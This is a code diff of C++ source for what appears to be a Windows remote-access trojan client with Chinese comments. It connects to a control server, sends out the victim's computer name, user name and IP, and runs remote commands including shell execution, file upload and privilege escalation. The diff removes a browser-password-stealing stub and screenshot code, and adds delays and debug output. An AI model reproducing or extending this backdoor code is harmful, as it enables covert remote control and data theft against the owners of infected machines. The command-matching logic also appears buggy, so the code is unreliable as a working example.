@@ -10,10 +10,6 @@ int sendFile(SOCKET fd, char* buf);//文件上传
 
 int Shell(SOCKET fd, char* buf);//执行shell指令
 
-//void SendScreenShot(SOCKET fd);//获取屏幕截图并且发送
-
-int GetPassword(SOCKET fd);//获取浏览器密码
-
 bool UpPrivilegeValue();//提权操作
 
 int main()
@@ -31,6 +27,7 @@ int main()
 	char str[] = "connect success";//连接成功
 	encode(str);
 	send(fd, str, strlen(str), 0);
+	Sleep(200);
 
 	GetPCMessage(fd);//将PC信息发送给服务端
 
@@ -67,23 +64,10 @@ int main()
 			th4.join();
 			continue;
 		}
-		//else if (strcmp(command, "scrennshot"))
-		//{
-		//	//CaptureImage(GetDesktopWindow(), "./", "screen"); //保存screen.jpg
-		//	thread th5 = thread(SendScreenShot, fd);
-		//	th5.join();
-		//	continue;
-		//}
-		else if (strcmp(command, "getpassword"))
-		{
-			thread th6 = thread(GetPassword, fd);
-			th6.join();
-			continue;
-		}
 		else if(strcmp(command, "upright"))
 		{
-			thread th7 = thread(UpPrivilegeValue);
-			th7.join();
+			thread th5 = thread(UpPrivilegeValue);
+			th5.join();
 			continue;
 		}
 		else if (strcmp(command, "kill"))
@@ -131,39 +115,33 @@ int main()
 int GetPCMessage(SOCKET fd)
 {
 	PC_Message msg;//定义msg结构体
-	char UserName[BUFSIZ * 2];//定义和初始化
-	char block;//接受发送来的字符
+	char UserName[BUFSIZ] = { 0 };//定义和初始化
 
 	if (getmessage(&msg) == false)//获取目标计算机的IP，计算机名以及用户名
 	{
-		err("getmessage");
+		//err("getmessage");
 	}
 
 	TcharToChar(msg.UserName, UserName);//将TCHAR转换为char
-
 	encode(msg.PCName);//加密
 	//cout << msg.PCName << endl;
 	encode(UserName);
-	//cout << msg.UserName << endl;
+	cout << strlen(msg.PCName) << endl;
+	cout << UserName << endl;
+	cout << strlen(UserName) << endl;
 	encode(msg.IP);
+	cout << strlen(msg.IP) << endl;
 	//cout << msg.IP << endl;
 
-	if (send(fd, msg.PCName, strlen(msg.PCName), 0) == INVALID_SOCKET)//发送相应的计算机信息
-	{
-		//err("send");
-	}
-	recv(fd, &block, 1, 0);			//接受一个字符防止粘包
-	if (send(fd, UserName, strlen(UserName), 0) == INVALID_SOCKET)
-	{
-		//err("send");
-	}
-	recv(fd, &block, 1, 0);
-	if (send(fd, msg.IP, strlen(msg.IP), 0) == INVALID_SOCKET)
-	{
-		//err("send");
-	}
-	recv(fd, &block, 1, 0);
-
+	send(fd, msg.PCName, strlen(msg.PCName), 0);
+	Sleep(200);
+	
+	send(fd, UserName, strlen(UserName), 0);
+	Sleep(200);
+	
+	send(fd, msg.IP, strlen(msg.IP), 0);
+	Sleep(200);
+	
 	return 0;
 }
 
@@ -281,19 +259,6 @@ int Shell(SOCKET fd, char* buf)
 		encode(text);
 		send(fd, text, strlen(text), 0);
 	}
-	return 0;
-}
-
-//void SendScreenShot(SOCKET fd)
-//{
-//	//保存桌面截图至str指向的位置
-//	const char* str = "C:\\Windows\\Screenshots.bmp";
-//	ScreenShot((LPCTSTR)(CString)str);
-//	readSrc(fd);
-//}
-
-int GetPassword(SOCKET fd)
-{
 	return 0;
 }
 
